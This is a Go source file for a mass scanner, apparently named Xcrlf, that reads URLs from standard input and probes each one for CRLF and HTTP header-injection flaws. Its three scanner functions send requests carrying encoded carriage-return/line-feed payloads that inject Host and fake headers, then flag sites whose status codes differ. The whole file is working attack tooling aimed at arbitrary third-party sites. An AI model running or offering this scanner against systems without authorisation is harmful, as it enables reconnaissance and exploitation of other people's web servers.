package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

func main() {
	arg1 := ""
	arg1 = os.Args[1]
	var wg sync.WaitGroup
	sc := bufio.NewScanner(os.Stdin)
	c := make(chan struct{}, 50)
	if arg1 == "-r" {
		content, _ := os.ReadFile("Xcrlf_resume.txt")
		//fmt.Println(string(content))
		Cont, _ := strconv.Atoi(strings.ReplaceAll(string(content), "\n", ""))
		cont := 0
		for sc.Scan() {
			cont += 1
			wg.Add(1)
			_, err := url.Parse(sc.Text())
			if err == nil {
				line := sc.Text()
				cmd := "echo " + strconv.Itoa(cont) + " > Xcrlf_resume.txt"
				_, err := exec.Command("sh", "-c", cmd).Output()
				if err != nil {
					log.Fatal(err)
				}
				if cont >= Cont {
					if isUrl(line) == true {
						go Scanner1(line, c, &wg)
						go Scanner2(line, c, &wg)
						go Scanner3(line, c, &wg)

						time.Sleep(150 * time.Millisecond)

					}

				}

			}

		}

	} else {
		cont := 0
		//os.Create("resume.txt")

		for sc.Scan() {
			cont += 1
			wg.Add(1)
			_, err := url.Parse(sc.Text())
			if err == nil {
				line := sc.Text()
				cmd := "echo " + strconv.Itoa(cont) + " > Xcrlf_resume.txt"
				_, err := exec.Command("sh", "-c", cmd).Output()
				if err != nil {
					log.Fatal(err)
				}

				if isUrl(line) == true {
					go Scanner1(line, c, &wg)
					go Scanner2(line, c, &wg)
					go Scanner3(line, c, &wg)

					time.Sleep(150 * time.Millisecond)

				}
			}

		}

	}
	cmd := "rm  Xcrlf_resume.txt"
	_, err := exec.Command("sh", "-c", cmd).Output()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("done ...")

	time.Sleep(100000 * time.Millisecond)
	go func() {

		close(c)
		fmt.Println("c closed")
	}()
	for msg := range c {
		fmt.Println(msg)
	}
}

func Scanner1(url string, c chan struct{}, wg *sync.WaitGroup) {
	HostHeader := strings.Split(url, "/")[2]
	url2 := url + "/%20HTTP/1.1%0d%0aHost:%20" + HostHeader + "%0d%0a%0d%0a"
	_, RealHostHeader := requester(url2)
	url3 := url + "/%20HTTP/1.1%0d%0anothost:%20" + HostHeader + "%0d%0a%0d%0a"
	_, fakeHostHeader := requester(url3)
	if RealHostHeader != "" && fakeHostHeader != RealHostHeader && fakeHostHeader == "400" {
		fmt.Println("[Xcrlf_methode1] " + url + " realHost :" + RealHostHeader + " fakeHost :" + fakeHostHeader)
		<-c
	}

}
func Scanner2(url string, c chan struct{}, wg *sync.WaitGroup) {
	HostHeader := strings.Split(url, "/")[2]
	url2 := url + "/%0aHost:%20" + HostHeader + "%0a"
	_, normal := requester(url2)
	url3 := url + "/%0aKost:%20" + HostHeader + "%0a"
	_, bad := requester(url3)
	if normal != "" && bad != normal && bad == "400" {
		fmt.Println("[Xcrlf_methode2] " + url + " Normal :" + normal + " Bad :" + bad)
		<-c
	}

}

func Scanner3(url string, c chan struct{}, wg *sync.WaitGroup) {
	HostHeader := strings.Split(url, "/")[2]
	url2 := url + "/%20HTTP/1.1%0d%0aKost:%20" + HostHeader + "%0d%0aX:Bar"
	_, normal := requester(url2)
	url3 := url + "/%20HTTP/1.1%0d%0akost:%20" + HostHeader + "%0d%0a%0d%0a"
	_, bad := requester(url3)
	if normal != "" && bad != normal && bad == "400" {
		fmt.Println("[Xcrlf_methode3] " + url + " Normal :" + normal + " Bad :" + bad)
		<-c
	}

}

func requester(url string) (string, string) {
	response := ""
	scode := ""
	resp, err := http.Get(url)
	if err == nil {
		defer resp.Body.Close()

		body, _ := ioutil.ReadAll(resp.Body)
		response = string(body)
		scode = strconv.Itoa(resp.StatusCode)

	}

	return response, scode

}

func isUrl(url string) bool {
	s := false
	regex1, _ := regexp.MatchString("http", url)
	regex2, _ := regexp.MatchString("://", url)
	if regex1 == true && regex2 == true {

		s = true
	}
	return s
}
